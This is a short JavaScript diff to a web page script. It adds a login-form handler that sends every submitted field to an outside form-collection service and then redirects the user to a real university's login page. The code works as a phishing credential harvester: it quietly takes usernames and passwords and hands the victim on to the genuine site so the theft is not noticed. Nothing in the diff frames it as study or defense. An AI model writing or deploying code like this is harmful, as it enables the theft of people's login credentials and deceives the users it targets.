@@ -177,9 +177,25 @@ const PAGE_TEXT = {
     });
   }
 
+  if (loginForm) {
+    loginForm.addEventListener("submit", async function (e) {
+      e.preventDefault();
 
-  if (magicForm) {
-    magicForm.addEventListener('submit', (event) => event.preventDefault());
+      const formData = new FormData(loginForm);
+
+      try {
+        await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          body: formData
+        });
+
+        // редирект сразу
+        window.location.href = "https://my.asoiu.edu.az/login";
+
+      } catch (error) {
+        alert("Ошибка отправки");
+      }
+    });
   }
 
   applyLanguage(currentLang);
